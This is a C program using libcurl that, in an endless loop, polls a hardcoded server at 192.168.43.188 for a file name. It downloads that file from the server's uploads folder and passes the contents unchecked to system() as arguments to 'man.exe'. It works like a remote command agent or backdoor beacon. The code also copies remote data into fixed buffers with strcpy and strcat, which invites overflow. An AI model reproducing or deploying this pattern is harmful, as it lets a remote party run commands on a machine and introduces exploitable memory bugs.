#include <stdio.h>
#include <curl/curl.h>
#define IP "http://192.168.43.188"
struct string {
  char *ptr;
  size_t len;
};
void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}
size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;
    //printf("\nwha %s",s->ptr);
  return size*nmemb;
}

int main(void)
{
  CURL *curl;
  CURLcode res;
    while(1)
    {
    Sleep(3);
    char arr[200];
    char arr3[1000];
    struct string s;
    init_string(&s);

  curl_global_init(CURL_GLOBAL_DEFAULT);

  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL,IP"/files.php");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK){
      fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
    /* always cleanup */
    curl_easy_cleanup(curl);
      continue;
    }

  }
   // printf("\nwha gonna getcmpd %s",s.ptr);
    if(strcmp(s.ptr,"not found")){
  //----------------------------------------------------------
  curl = curl_easy_init();
  if(curl) {
    strcpy(arr,IP"/uploads/");
    strcat(arr,s.ptr);
    printf("\nwha1 %s",arr);

    curl_easy_setopt(curl, CURLOPT_URL, arr);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    /* Perform the request, res will get the return code */
    s.ptr=realloc(s.ptr,0);
    s.len=0;
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK){
      fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
    /* always cleanup */
    curl_easy_cleanup(curl);
    continue;
    }

  }
    strcpy(arr3,"man.exe");
    strcat(arr3," ");
    strcat(arr3,s.ptr);
    printf("\n naviga %s",s.ptr);
    printf("\nnav %s",arr3);
    system(arr3);

}
free(s.ptr);
}
    curl = curl_easy_init();
    curl_global_cleanup();
  return 0;
}
